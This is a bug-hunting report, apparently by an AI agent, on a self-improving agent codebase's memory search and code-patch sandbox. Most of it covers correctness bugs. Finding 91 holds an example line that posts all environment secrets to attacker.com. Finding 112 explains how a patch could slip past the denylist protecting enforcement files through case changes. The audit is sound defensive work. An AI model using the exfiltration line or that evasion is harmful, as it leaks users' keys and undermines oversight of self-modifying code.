# Sesiune de debugging — runda 4 (focus BRSI + FMS: the MOAT)

**Autor:** Arena Agent Mode
**Data:** 2026-08-20
**Metoda:** analiză statică, ochii pe fișier, `file:linie` pentru fiecare finding.

**Zone acoperite runda asta:**
- **FMS (Fractal Memory Search):** `FeralAgent/src/memory/fractal/*.ts` — 17 fișiere, ~2900 linii
- **BRSI engine:** `FeralAgent/src/rsi/*.ts` — event bus, ratchet, selection, extinction, PBT, goal-mode, dream cycle
- **L2 LoRA adapt:** `FeralAgent/src/rsi/l2-adapt/lora-pipeline.ts`
- **L3 code-RSI:** `FeralAgent/src/rsi/l3-code/code-sandbox.ts`, `code-genome.ts`, `pending-patches.ts`, `code-leaves.ts`
- **L5 governance:** `governance-lifecycle.ts`
- **L6 meta-evolution:** `meta-evolution.ts`
- **Infra:** `event-bus.ts`, `contract-runner.ts`, `journal.ts`, `hash-chain.ts`, `confidence.ts`, `eval-worker.ts`, `pbt-controller.ts`, `champion.ts`, `champion-tree.ts`

Total: **~28 bug-uri noi**, cu accent pe cele care erode MOAT-ul (data integrity RSI, correctness FMS, security patch loop).

---

## SEVERITATE CRITICĂ — MOAT-breakers, data loss, security

### 91. `code-sandbox.ts::bunExec` inherit-ează întreg env → orice test-suite din patch poate exfiltrate FERAL_API_KEY, FERAL_DB_KEY, OS keychain-uite

`FeralAgent/src/rsi/l3-code/code-sandbox.ts:247-278`:

```ts
export async function bunExec(cmd, opts) {
  const proc = Bun.spawn({
    cmd: resolveCmd(cmd),
    cwd: opts.cwd,
    env: { ...process.env },   // ← ALL parent env
    ...
  });
```

Every candidate patch runs `bun test` în worktree cu `env: { ...process.env }`. Environment sidecar-ului conține:
- `FERAL_API_KEY` (loopback bearer)
- `FERAL_DB_KEY` (at-rest encryption master key pentru semantic memory PII)
- `FERAL_LOCAL_API_KEY`
- Orice BYOK provider keys care s-au propagat prin env
- `OPENAI_API_KEY`, `ANTHROPIC_API_KEY` din shell-ul user-ului

Un patch RSI-generat malițios (sau simply un patch care importă o library cu postinstall/test-time execute) → cod-ul din test-suite face `fetch(attacker.com, { body: process.env })` → **complete secret exfiltration**.

Comparativ, `crates/feral-core/src/tools.rs:405` face `env_clear()` pentru `code_execute` tool și copiază DOAR `PATH` + `PYTHONIOENCODING` + Windows SYSTEM vars. Design corect există în cod, dar NU e aplicat la code-RSI sandbox.

Fix: `env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "", ...(process.platform === "win32" ? win32Minimal() : {}) }` — minimum necesar pentru `bun install/test/tsc/build`.

**Impact:** critical. **Aceasta erodează MOAT-ul RSI direct**: o singură iterație rea și keys sunt afară. Watchdog-ul de crash face revert-ul patch-ului, dar secretele deja au plecat.

---

### 92. `#nextLeafId` colide cu episodic.id → merge greșit între semantic hits și FTS hits

`FeralAgent/src/memory/fractal/fractal-memory.ts:882-889`:

```ts
#nextLeafId(): number {
  const taken = new Set<number>();
  for (const id of this.#pendingLeaves.keys()) taken.add(id);
  if (this.#leavesById) for (const id of this.#leavesById.keys()) taken.add(id);
  let candidate = 1;
  while (taken.has(candidate)) candidate++;
  return candidate;
}
```

`taken` verifică doar `#pendingLeaves` (in-memory) și `#leavesById` (last built tree — populat DOAR după rebuild). NU consultă:
- `#leafStore.all()` — leaves durabile persistate din alte sesiuni
- Fresh `loadLeaves()` — sursa autoritativă (episodic table via SQL, auto-increment ids `1, 2, 3, ...`)

**Consequința**: la primul `upsertLeaf` care intră **înainte** de primul rebuild (sau după `init()` fără tree), `#leavesById === null` și `#pendingLeaves` empty → `candidate = 1` → **directly collides cu episodic.id = 1**.

Cascadă în `fractal-recall.ts:170-190`:
```ts
// Merge by id. FTS5 contributes text/sessionId/ts; semantic contributes score.
merged.set(hit.leafId, { id: hit.leafId, ..., sessionId: leaf?.sessionId, ... });
for (const ev of ftsEvents) {
  const existing = merged.get(ev.id);   // ← id COLLISION here
  if (existing) {
    existing.text = ev.content;         // ← FTS wins, overwrites semantic leaf text
    existing.sessionId = ev.sessionId;
  }
```

Un upsertLeaf leaf cu id=5 și un episodic row cu id=5 se merge în SAME `MergedHit`. Text vine de la FTS episode, dar sessionId din leaf → session filter poate keep leaf-ul while text-ul e altul. **Recall returnează chunks amestecate din două entities distincte, prezentate ca un singur "hit"**.

Fix: `#nextLeafId` să porneasc de la `1_000_000` (spațiu rezervat pentru upsert leaves, disjoint de episodic auto-increment care începe de la 1); sau folosească un negative range; sau consulte `#leafStore.all() ∪ freshLoadLeaves()`.

**Impact:** critical. FMS recall dă rezultate incorecte deterministic. Direct MOAT-breaker.

---

### 93. `cross-session-dedup.ts` — survivor cu provenance actualizată NU e re-persistată; caller shterge absorbed dar și survivor uneori

`FeralAgent/src/memory/fractal/cross-session-dedup.ts:80-107` + `fractal-memory.ts::dedup():671-682`:

Grouparea în `dedupAcrossSessions`:
```ts
const all = [a, ...absorbed];
const survivor = all.reduce((earliest, cur) =>
  cur.first_seen_at < earliest.first_seen_at ? cur : earliest,
);
const others = all.filter((l) => l.id !== survivor.id);
groups.push({
  survivor: { ...survivor, last_seen_at: max, hit_count: sum },
  absorbed: others,   // ← includes `a` if `a` was NOT earliest
});
```

Dacă `a` (iteration seed) NU e cel mai vechi, `others` conține `a` → `absorbed` includes `a.id`.

Caller (`fractal-memory.ts:672`):
```ts
const absorbedIds = groups.flatMap((g) => g.absorbed.map((l) => l.id));
this.#leafStore.remove(absorbedIds);
```

**Bug 1**: `a.id` e removed. Dacă `a` era gândit ca "survivor" în iterația inițială, dar apoi în reduce s-a găsit că `a` nu era earliest, se șterge silent.

**Bug 2 mai grav**: `groups[i].survivor` are `hit_count` cumulat + `last_seen_at` max. Aceste updates **NU SUNT PERSISTATE**. `dedup()` doar face `remove(absorbedIds)`. Survivor-ul rămâne în `#leafStore` cu OLD provenance (hit_count vechi, last_seen_at vechi). **Deduplicated hit info is LOST** pe primul boot next.

Cascadă la eviction: `AgeAndHitCountEviction` la eviction.ts:44 vede survivor-ul cu `hit_count` vechi (poate = 1) → evict → un fapt aggregat din 20 sessions devine "cold and stale" și dispare.

Fix: după `remove(absorbedIds)`, adaugă:
```ts
for (const g of groups) {
  const surv = this.#leafStore.all().find(r => r.id === g.survivor.id);
  if (surv) {
    surv.provenance.hit_count = g.survivor.hit_count;
    surv.provenance.last_seen_at = g.survivor.last_seen_at;
    this.#leafStore.upsert(surv);
  }
}
```

**Impact:** critical pentru long-run sessions. Aggregation data lost across every dedup pass.

---

### 94. `upsertLeaf` — provenance key deduplication greșită: cheia setată dar leaf-ul nu găsit → double insert cu NEW id + provenance key consumat

`FeralAgent/src/memory/fractal/fractal-memory.ts:733-742`:

```ts
if (this.#provenanceKeys.has(key)) {
  const existingId = [...this.#pendingLeaves.entries()].find(
    ([, l]) => l.text === opts.text,
  )?.[0];
  if (existingId !== undefined) {
    return { kind: "grow", leafId: existingId };
  }
}
```

`#provenanceKeys.has(key)` returnează true (setat la un insert precedent), dar codul caută leaf-ul DOAR în `#pendingLeaves`. Nu consulte:
- `#leafStore` durabil (leaves din alte sesiuni)
- Cazul unde leaf-ul din pending a fost promoved la `#leavesById` după rebuild (moved out of pending)

Când `existingId === undefined`, funcția **cade prin la step 2 (nearest-cosine)** fără să facă return. Dacă nearest e ≥ threshold → merge (bump provenance), OK. Dacă nearest < threshold → **NEW insert cu NEW id, SAME provenance key**. Idempotency broken.

`#provenanceKeys.add(key)` de la linia 784 va face `Set.add` care-i no-op (deja există). Al treilea apel similar va găsi `has(key) === true` dar tot nu găsește în pending → cade prin din nou → 3rd insert.

Fix: consultă `#leafStore` sau `loadLeaves()` sau maintain `#provenanceKeys → leafId` (Map în loc de Set).

**Impact:** medium-high — same fact stored multiple times în leafStore, contaminates dedup + recall.

---

### 95. `event-bus.ts::emit` — handler throw stops cascade mid-way; state inconsistent

`FeralAgent/src/rsi/infra/event-bus.ts:107-125`:

```ts
async emit(event: RsiEvent): Promise<void> {
  ...
  this.queue.push(event);
  if (this.pumping) return;
  this.pumping = true;
  try {
    while (this.queue.length > 0) {
      const next = this.queue.shift()!;
      const list = this.handlers.get(next.type);
      if (!list) continue;
      for (const handler of list) {
        await handler(next);   // ← throw propagates out, cascade stops
      }
    }
  } finally {
    this.pumping = false;
  }
}
```

Contract-ul emit: "cascade determinist, un event fully handled before next". Dar dacă un handler face throw:
1. `await handler(next)` throw
2. Loop break, ajunge la `finally` → `pumping = false`
3. Throw propagates la caller-ul care apelase `emit`
4. `queue` are events noi push-ate de handlers precedent + events LEFT unfired
5. **Next `emit()` call** găsește `pumping = false` → intră în pump nou → drenă rest queue amestecat cu noul event

Cascadă EvalComplete → RatchetAdvanced → SelectionMutation. Dacă RatchetHandler throw după emit RatchetAdvanced, SelectionMutation nu-l primeşte în acel pump — dar `queue` are RatchetAdvanced already popped, RatchetAdvanced e "lost" pentru handlerii care nu s-au execuat. Iar dacă un handler EvalComplete precedent făcuse `this.bus.emit({type: 'RatchetAdvanced', ...})`, acea `emit` a completat sync (pumping=true → return imediat), iar acum evenimentul rămâne în queue but nobody-l va procesa dacă `pumping=false` și next `emit` procesează UN nou event care nu are RatchetAdvanced handler (different flow).

**Fix:** wrap `await handler(next)` în try/catch, log errors, continuă cascadă. Contract-ul zice deja "cascade must not lose events".

**Impact:** high pentru RSI correctness. Un bug într-un handler L1 poate opri chain-ul înainte ca ExtinctionHandler să vadă EvalComplete → monoculture nu detectat → GoodhartDetected niciodată emitted → engine se blochează silent într-o convergență locală.

---

### 96. `journal.ts::appendJournal` — race pe hash chain identic §68 dar TS

`FeralAgent/src/rsi/infra/journal.ts:168-181`:

```ts
export function appendJournal(path: string, entry: JournalEntry): void {
  try {
    mkdirSync(dirname(path), { recursive: true });
    const { prevHash: _p, hash: _h, ...body } = entry;
    const prevHash = lastChainHash(path);   // ← read
    const hash = chainHash(prevHash, body);
    appendFileSync(path, JSON.stringify({ ...body, prevHash, hash }) + "\n", "utf8");   // ← write
  } catch { ... }
}
```

RSI engine event-driven. Multiple handlers pot apela `appendJournal` concurent (nu real "concurrent" în Node single-thread, dar await-uri interleaved). Node fs sync într-un async chain — dacă între `lastChainHash` și `appendFileSync` alt task face `appendJournal` sync (fs SYNC nu-i preempted), same prevHash computed de doi apelanți concurenți, first append comitte hash-A, second append computes hash cu OLD prev → chain break la `verifyJournal`.

Node single-thread mitigă parțial (sync IO în Node BLOCK event loop), dar cu Bun's `Bun.file` async patterns există gap-uri. Plus, altă sursă de race: `hash-chain.ts::appendChained` (folosit de governance) — same pattern, comentariu "fail loud" doar pentru IO, nu race.

Fix: `withLock` internal (in-process mutex) sau file lock (flock).

**Impact:** medium-high. Journal-ul e sursa de adevăr pentru L6 meta-evolution — chain break înseamnă că meta-genome-ul următor citează evidence corupt.

---

### 97. `dream-scheduler.ts::start` — `setInterval` leaked forever, no cleanup

`FeralAgent/src/rsi/l1-config/dream-scheduler.ts:116-127`:

```ts
start(): void {
  if (this.shuttingDown) return;
  const schedule = this.deps.schedule ??
    ((cb, ms) => {
      const t = setInterval(cb, ms);
      if (typeof t === "object" && ...) (t as {unref: () => void}).unref();
    });
  schedule(() => void this.tick(), this.deps.pollMs ?? 30_000);
}
```

Timer-ul returnat de `setInterval` NU e salvat nicăieri. `shutdown()` doar setează `shuttingDown = true`:

```ts
shutdown(): void {
  this.shuttingDown = true;
}
```

Timer-ul continuă să firing forever, `tick()` face early return pe `shuttingDown` — dar continua să ruleze CPU cycles + trigger evaluation.

Rebuild scheduler (app restart, hot reload dev) → old timer STILL live + new timer → 2× polls, apoi 3×, etc.

Fix: `this.#pollTimer = setInterval(...); shutdown() { clearInterval(this.#pollTimer); }`.

**Impact:** medium. Nu-i critic în dev app cycle, dar sub `feral gateway restart` pe zi = accumulated timer leak.

---

### 98. `pending-patches.ts::#save` — non-atomic writeFileSync pe fișier critical pentru RSI approval workflow

`FeralAgent/src/rsi/l3-code/pending-patches.ts:92-96`:

```ts
#save(): void {
  mkdirSync(dirname(this.file), { recursive: true });
  const envelope: Envelope = { version: 1, patches: this.#patches };
  writeFileSync(this.file, JSON.stringify(envelope, null, 2));   // ← non-atomic
}
```

`pending-patches.json` este citit atât de sidecar-ul TS (constructor) cât şi de Rust watchdog (`watchdog.rs::applied_patch_text`, `mark_patch_reverted`). Crash mid-write → JSON corupt → toate patch-urile pending devin invizibile → user pierde toate approvals + candidate scores.

Watchdog Rust va nu putea revert patch (patch_text unreadable) → potentially un patch defect rămâne aplicat pe LIVE source tree.

Fix: `atomicWriteFileSync` (helper există în `memory/graph.ts`).

**Impact:** high — MOAT-critical, corrupted L3 patch state = broken auto-revert = broken code-RSI safety.

---

### 99. `champion.ts::writeChampion` + `champion-tree.ts::writeChampionTree` — same non-atomic pattern

`FeralAgent/src/rsi/l1-config/champion.ts:70-73`:

```ts
export function writeChampion(path: string, record: ChampionRecord): void {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, JSON.stringify(record, null, 2), "utf8");
}
```

`champion.json` este citit la boot pentru resume RSI (linia 390 din sidecar.ts). Crash mid-write → JSON corupt → RSI resume nu găsește champion → boot cold from default → pierde toate gains RSI din session anterioară.

`championTree` (per-niche archive) same pattern.

Fix: atomic writeFileSync (tmp + rename). Same pattern din L6 `meta-evolution.ts::persist` care e implementat corect.

**Impact:** high — pe fiecare crash, RSI regresează la seeds cold.

---

### 100. `code-sandbox.ts` — `bun install` fără `--ignore-scripts` = arbitrary code exec la install time

`FeralAgent/src/rsi/l3-code/code-sandbox.ts:148`:

```ts
const installed = await exec(["bun", "install"], { cwd: pkgDir, timeoutMs: t.installMs });
```

Deşi `code-genome.ts::DEFAULT_CODE_PATCH_POLICY` restrictează la `src/rsi/*.ts`, care blochează modificări la `package.json`, un scenariu edge: dacă vreodată policy-ul se relaxează, sau dacă patch-ul agent include `import "new-untrusted-pkg"` care ajunge automat în bun's dep resolution (nu, pentru că package.json nu-i modificată — deci nu se instalează new deps). OK.

Real bug: `bun install` re-installează dependencies existente și rulează `postinstall` script-uri EXISTING din packages care sunt deja în `package.json`. Dacă un dep existent (say, `@whiskeysockets/baileys`) are lifecycle scripts, acele scripts rulează în worktree cu env full (bug §91). Not agent-triggered dar attack surface implicit.

Fix defense-in-depth: `bun install --ignore-scripts` pentru worktree eval.

**Impact:** medium. Combinat cu §91 e periculos.

---

## SEVERITATE ÎNALTĂ — logic errors, correctness

### 101. `tree-builder.ts::queryTree` (`tree-query.ts:66`) — cosine calculată de 2× per compare în sort → O(n log n × dim)

`FeralAgent/src/memory/fractal/tree-query.ts:65-68`:

```ts
expanded.sort(
  (a, b) => cosine(qVec, b.node.centroid) - cosine(qVec, a.node.centroid),
);
```

Compare function apelează `cosine` de 2× per iteration. Cu dim=1024 embed și frontier=100 la unul din nivele, sort e ~100 × log(100) × 2 × 1024 = **~1.4M FLOPs pentru un singur nivel**. Recall face descent pe multiple levels + final leaf scoring, total 5-10M FLOPs în hot path.

Fix (elementar):
```ts
const scored = expanded.map(f => ({ f, s: cosine(qVec, f.node.centroid) }));
scored.sort((a, b) => b.s - a.s);
frontier = scored.slice(0, opts.beam).map(x => x.f);
```

Reduce la ~100 × 1024 = 100K FLOPs pentru cosine + O(n log n) pentru sort comparisons care sunt doar number compares.

**Impact:** medium — MOAT performance. FMS recall latency este vindication ("this is faster than FTS5"). O încetinire 14× în hot path anulează argumentul.

---

### 102. `fractal-recall.ts::recall` construiește `new FractalRecallEngine(...)` la fiecare apel

`FeralAgent/src/memory/fractal/fractal-memory.ts:384-392`:

```ts
async recall(query: string, sessionId: string): Promise<RecallResult> {
  if (this.#tree && this.#leavesById) {
    try {
      const engine = new FractalRecallEngine({   // ← new per call
        tree: this.#tree,
        embed: this.#embed,
        ftsSearch: this.#ftsSearch,
        leavesById: this.#leavesById,
      });
```

Allocation overhead per query. Mic dar consistent — pe agent loop care cheamă recall pe fiecare user turn, e alocări repetate + potential GC pressure.

Fix: cache engine, invalidate la rebuild (`#doRebuild()` end) sau la `#leavesById` swap.

**Impact:** low-medium — hot path GC noise.

---

### 103. `provenanceKey` FNV-1a 32-bit → birthday collision la ~65k leaves

`FeralAgent/src/memory/fractal/fractal-memory.ts:903-912`:

```ts
function provenanceKey(text: string, firstSeenAt: number): string {
  let h = 0x811c9dc5;
  const combined = `${text}\u0000${firstSeenAt}`;
  for (let i = 0; i < combined.length; i++) {
    h ^= combined.charCodeAt(i);
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h.toString(16);
}
```

Space: 2^32 ≈ 4.3B. Birthday paradox: 50% probabilitate collision la ~65k inserturi. Un long-run install cu 100k+ facts extracted din chat va lovi collision.

Consecință: **fals-pozitiv idempotency** — `#provenanceKeys.has(key)` returnează true pentru un new leaf care doar hash-collides cu unul existent. Combinat cu §94, cade prin la nearest-cosine, poate produce inserturi silent duplicate SAU merge greșit.

Comentariul recunoaște "Good enough for dedup; not for crypto" — dar birthday e pentru dedup, exact acest scenariu.

Fix: SHA-256 (crypto.subtle sau `createHash('sha256')`) → base64 first 20 bytes. Sau reuse `sha256Canonical` din `hash-chain.ts`.

**Impact:** medium — data loss silent la installs mari.

---

### 104. `leaf-store.ts::upsert` — full rewrite per insert = O(n²) pe batch

`FeralAgent/src/memory/fractal/leaf-store.ts:92-95`:

```ts
upsert(rec: LeafRecord): void {
  this.#records.set(rec.id, rec);
  this.#persist();   // ← rewrites ENTIRE file
}
```

`#persist` la 119:
```ts
const body = this.all().map((r) => JSON.stringify(r)).join("\n");
```

Batch reactive-write (extractorul semantic la end-of-turn extract 5-10 facts) → 10× `upsert()` → 10× full file rewrite. La 10k leaves ×10 = 100k JSON stringify + 10× disk syncs.

Fix: `upsertAll(recs[])` care face un singur `#persist`. Sau append-only journal cu periodic compaction.

**Impact:** medium — disk I/O amplification. Sub load real se vede latency degradation la extractor.

---

### 105. `leaf-store.ts::#persist` — same `.tmp` per write; race pe concurrent upsert

`FeralAgent/src/memory/fractal/leaf-store.ts:118-125`:

```ts
#persist(): void {
  if (this.#inMemory) return;
  mkdirSync(dirname(this.#path), { recursive: true });
  const body = this.all().map((r) => JSON.stringify(r)).join("\n");
  const tmp = `${this.#path}.tmp`;   // ← same tmp name, no pid/counter
  writeFileSync(tmp, body.length ? body + "\n" : "", "utf8");
  renameSync(tmp, this.#path);
}
```

Node fs sync în await chain — dacă un `#persist` e în progres și un al doilea `upsert` triggerează al doilea `#persist` (sync în același proces, nu-i real concurrent la Node, DAR între rebuild worker task și event handler cascade poate exista sync mid-async).

Bun runtime + `Bun.spawn` sync fs — dacă alt Bun runtime instanță (nu cazul aici, dar test setup) → tmp collision.

Al doilea aspect: `renameSync` overwrite → dacă crash între `writeFileSync(tmp)` și `renameSync`, `tmp` rămâne pe disc forever + un boot next va vedea `fractal-leaves.jsonl.tmp` care e ignored (dar acumulate).

Fix: `${this.#path}.tmp.${process.pid}.${counter++}` pattern (identic cu `watchdog.rs::save_marker`).

---

### 106. `tree-store.ts::saveTree` — non-atomic writeFileSync pe tree persistent

`FeralAgent/src/memory/fractal/tree-store.ts:80-88`:

```ts
export function saveTree(path: string, tree: TreeNode): void {
  const envelope = {
    version: TREE_STORE_VERSION,
    builtAt: Date.now(),
    leafCount: tree.leafIds.length,
    tree: serializeTree(tree),
  };
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, JSON.stringify(envelope));
}
```

Non-atomic. Crash mid-write → `loadTree` returnează null → forced rebuild → cloud costs (embed thousands leaves + summarize hundreds of clusters via LLM). O rebuild pe un corpus mare = **~$5-20 în API calls per un accident de write**.

Fix: tmp + rename.

**Impact:** medium-high pe cost + latency (rebuild ia minutes).

---

### 107. `PbtController::exploitExplore` — stable sort la equal fitness → primul insert e mereu overwritten

`FeralAgent/src/rsi/l1-config/pbt-controller.ts:203-217`:

```ts
private exploitExplore(): PbtReplacement[] {
  ...
  const ranked = [...this.strats].sort((a, b) => b.fitness - a.fitness);
  const topPool = ranked.slice(0, k);
  const bottomPool = ranked.slice(n - k);

  const replaced: PbtReplacement[] = [];
  for (const loser of bottomPool) {
    const donor = topPool[Math.floor(this.rng() * topPool.length)] ?? topPool[0]!;
    if (donor.id === loser.id) continue;
    loser.hyperparams = this.perturb(donor.hyperparams);
    loser.fitness = 0;
```

La primele PBT cycles, toate strategies au fitness = 0. `sort` cu comparator returning 0 → stable sort (V8) menține ordinea inițială. `topPool` = primele k după insert order. `bottomPool` = ultimele k.

Prima iterație: primele k strategii "câștigă" mereu, ultimele k perturb-uite din primele k. **PBT nu-i random, e position-biased**. Strategy 0-1 din seed-uri devin dominante artificial.

Fix: la fitness egal, shuffle cu `rng`. Sau folosește PriorityQueue cu tie-breaker on random.

**Impact:** medium — MOAT-adjacent. PBT are scopul de explora hyperparams; bias-ul reduce exploration.

---

### 108. `population-manager.ts::cosineSimilarity` — length mismatch returnează silent 0.something în loc de throw

`FeralAgent/src/rsi/l1-config/population-manager.ts:393-405`:

```ts
export function cosineSimilarity(a: number[], b: number[]): number {
  const n = Math.min(a.length, b.length);   // ← masks dim mismatch
  let dot = 0;
  ...
```

Behavioral fingerprints ar trebui să aibă length constant (numărul de eval tasks). Dacă un genome are missing tasks (partial eval), fingerprint diferă în length. `Math.min` mask-uiește erori care ar trebui să crash-uiască — silent behavior wrong-but-plausible.

Fix: `if (a.length !== b.length) throw new Error('dim mismatch')`.

**Impact:** low. Rare, dar când se întâmplă, extinction handler decidence pe similarity greșit → cull greșit genome.

---

### 109. `crossover.ts::blendSimplex` — length mismatch cu `Math.min` truncă silent tool weights

`FeralAgent/src/rsi/l1-config/crossover.ts:58-64`:

```ts
function blendSimplex(a: number[], b: number[]): number[] {
  const n = Math.min(a.length, b.length);
  ...
```

Same story ca §108. Tool preference weights între parents pot avea length diferit (dacă tool registry a evoluat între iterații). Child pierde silent tool weights din fitter.

Fix: assert equal length; sau pad shorter with zeros before blend.

---

### 110. `fractal-recall.ts::semanticFacts` metric misnamed → toate metrics FMS raportează greșit

`FeralAgent/src/memory/fractal/fractal-recall.ts:257-259`:

```ts
const episodicHits = ranked.filter((h) => h.fts).length;
const semanticFacts = ranked.length;   // ← includes FTS-only hits too
```

`semanticFacts` include hit-uri care sunt FTS-only (no tree traversal, doar exact-match). Bench report vs FTS5 devine misleading — "semantic" number include contribuții FTS.

Fix: `semanticFacts = ranked.filter(h => !h.fts || h.viaSummaryPath.length > 0).length` (hit care traversat tree, chiar dacă FTS l-a boost-uit).

**Impact:** medium — metrics report incorect. Benchmark decisions bazate pe metrics greșite.

---

### 111. `dedupAcrossSessions` iteration order sensitivity — greedy earliest-first e greșit

`FeralAgent/src/memory/fractal/cross-session-dedup.ts:69-89`:

Greedy loop iterează în `leaves[]` ordinea originală. `a = leaves[i]`, dacă găsit absorbed → grupare. Dar dacă `leaves[i+1]` ar fi fost survivor mai bun (mai fresh cu hit_count mai mare), nu e considerat pentru grouping cu `leaves[i]` (marked used).

Rezultat: grupare non-optimal, survivor cu hit_count subtotal.

Fix: sort by (first_seen_at, hit_count) descrescător înainte iterating, sau union-find pentru corect clustering.

**Impact:** low-medium — dedup produce grouping suboptim, dar dedup-ul totuși progresează.

---

### 112. `code-genome.ts` policy — `denylistBasenames` fără directory context → false positive

`FeralAgent/src/rsi/l3-code/code-genome.ts:352-368`:

```ts
denylistBasenames: [
  "code-genome.ts",
  "code-sandbox.ts",
  ...
  "pending-patches.ts",
],
```

Check la `pathViolation` line 429:
```ts
const basename = p.slice(p.lastIndexOf("/") + 1);
if (policy.denylistBasenames.includes(basename)) { ... }
```

**Bug**: matcheaza pe basename, oriunde. Un patch care creează `src/rsi/l1-config/code-genome.ts` (diferit fișier decât `src/rsi/l3-code/code-genome.ts`) e blocat, chiar dacă nu e enforcement file. Fals positive.

Mai grav altul: nu prinde symlink attack sau `src/rsi/l3-code/CODE-GENOME.ts` case-insensitive (some FS: HFS+, NTFS default). O patch cu case swap va evade denylist pe case-insensitive FS.

Fix: full-path match + case-insensitive check pentru macOS/Windows.

**Impact:** low — attacker foarte specific ar trebui să exploiteze; totuși defense in depth.

---

## SEVERITATE MEDIE — nitpicks, defensive

### 113. `EvalWorker::run` — errored genome scored 0, dar `outcomes` empty → confidence gate primeşte 0 samples

`FeralAgent/src/rsi/infra/eval-worker.ts:80-95`:

```ts
} catch (err) {
  await this.bus.emit({
    type: "EvalComplete",
    genomeId: genome.id,
    score: 0,
    behavioralFingerprint: [],
    tokenCost: 0,
    durationMs: 0,
    errored: true,
    error: err instanceof Error ? err.message : String(err),
    // NO outcomes field
  });
}
```

RatchetHandler la linia 97 face `if (event.errored === true) return;` — deci nu ratchet pentru errored eval. Dar confidence gate downstream primește `outcomes: undefined`. La `contract-runner.ts::benchmarkSamples(state)` returnează 0 samples → gate rejects "insufficient samples".

Nu-i critic (behavior corect), dar Journal row conține score=0 și confidence=insufficient — user vede două motive de failure pentru unul.

---

### 114. `journal.ts::lastChainHash` re-reads full file per append

`FeralAgent/src/rsi/infra/journal.ts:188-201`:

```ts
function lastChainHash(path: string): string {
  if (!existsSync(path)) return GENESIS;
  const lines = readFileSync(path, "utf8").split("\n").filter((l) => l.trim().length > 0);
  ...
}
```

Comentariul recunoaște — cache Map<path, hash> ar rezolva. Per-day file rămâne mic, dar dacă log crește (long-run dream sessions, 1000+ entries/day), fiecare append e O(n).

---

### 115. `meta-evolution.ts::persist` — `.tmp` fără pid suffix

`FeralAgent/src/rsi/l6-meta/meta-evolution.ts:659-661`:

```ts
const tmp = `${this.statePath}.tmp`;
writeFileSync(tmp, JSON.stringify(state, null, 2), "utf8");
renameSync(tmp, this.statePath);
```

Same pattern ca §105. Concurrent evolve() calls (rare, but not impossible) → race pe tmp.

---

### 116. `goal-mode.ts::run` — `refill()` recursively-invoked via `.finally`, dacă handler throw → dead pool

`FeralAgent/src/rsi/l1-config/goal-mode.ts:180-190`:

```ts
const p = this.evalWorker
  .run(genome)
  .catch((err) => { console.error(...) })
  .finally(() => {
    inFlight.delete(p);
    refill();   // ← if this throws, pool never refills
  });
```

`refill()` accesează `this.pop.concurrency`, `this.queue.shift`, `this.checkStop(...)`. Dacă `pop` sau `queue` sunt drop-uite sau altered de handler concurent (nu foarte probabil, dar posibil în cascade EvalComplete → GenomeDied → SelectionMutation → pop.add), `refill()` poate throw. Throw în `.finally` propagates la Promise-ul din inFlight → unhandled rejection.

Fix: try/catch în refill body.

---

### 117. `contract-runner.ts::runContract` — handler throws NOT caught; nu ajunge la Journal terminal

`FeralAgent/src/rsi/infra/contract-runner.ts:100+`:

Comentariul explicit: "A stage that throws is a programming error in the leaf...NOT caught here".

Dar rezultat: throwing handler → Journal terminal row nu se scrie → invariant I3/I4 (one row per terminal) NU se respectă. `runContract` promises "always resolves" dar nu — throw propagates.

Fix: wrap entire loop în try/catch, on throw → terminal state cu `action: 'halt', reason: 'leaf error: {stage}: {err}'` + fire journal row.

---

### 118. `kmeans.ts` — empty cluster handling: `next.set(centroids[c]!)` reuse old centroid → convergence stuck

`FeralAgent/src/memory/fractal/kmeans.ts:145-152`:

```ts
if (count > 0) {
  for (let d = 0; d < dim; d++) next[d] = sum[d]! / count;
} else {
  // Empty cluster: keep the old centroid ...
  next.set(centroids[c]!);
}
```

Dacă un cluster e mereu empty (k > effective distinct clusters), old centroid rămâne pentru totdeauna. Lloyd's convergence check `if (!changed) break` va exit early pentru că assignments nu se schimbă (nobody assigned to empty cluster).

Rezultat: `k` clusters requested dar (k-empty) effective clusters. Tree builder cheamă `k = ceil(current.length / branch)` care ar putea produce empty parents → nodes cu 0 leaves → recall nu returnează hits pentru them.

Fix: re-seed empty cluster din point cel mai departe de assigned centroids (standard kmeans++ recovery).

---

## Recomandări prioritizate — round 4 (MOAT-focused)

1. **§91** — `env_clear` în `bunExec` pentru code-RSI worktree. Secret exfiltration primitive. FIX PRIMĂ.
2. **§92** — `#nextLeafId` să nu colide cu episodic auto-increment. FMS recall corrupt.
3. **§93** — `dedup()` să persist updated survivor provenance. Data loss on every dedup pass.
4. **§95** — `event-bus.emit` cascade throw handling. RSI engine determinism.
5. **§98, §99, §106** — `atomicWriteFileSync` peste tot în RSI + FMS state files. Helper deja există.
6. **§101** — cosine caching în queryTree. Performance MOAT.
7. **§103** — SHA-256 pentru provenanceKey. Birthday collision la scale.
8. **§104, §105** — LeafStore batch persist. I/O amplification.

---

## Ce n-am acoperit pe deplin

- `FeralAgent/src/rsi/l4-modules/*` (module-lifecycle, seam-runtime — 537 + 156 linii)
- `FeralAgent/src/rsi/l5-gov/governance.ts` (473 linii — apparent OK cu atomic writes)
- Bench orchestrator (`bench/orchestrator.ts` + `runner.ts`)
- `FeralAgent/src/memory/fractal/migration.ts` (schema migrations)
- `FeralAgent/src/brain/*` (brain-stack, task-classifier)

Trend peste 4 runde — patterns dominante rămân:
1. Non-atomic writes (~15 site-uri identificate, helper există)
2. Race conditions pe hash chains (audit.rs + journal.ts + hash-chain.ts)
3. HTTP/network fără timeout sau size cap
4. TOCTOU pe port bind, download insert, file existence
5. Substring/contains security checks
6. React/reactive-store listener race la async register + sync teardown
7. **NOW: RSI env inheritance** — code-sandbox exec cu parent env (§91) — un pattern nou care merită audit dedicat pe orice `spawn`/`exec` care rulează cod agent-generated.

Un audit sistematic prin `grep -rn "env: { \.\.\.process.env }" --include="*.ts"` ar identifica alte potentiale exfiltration surface-uri.
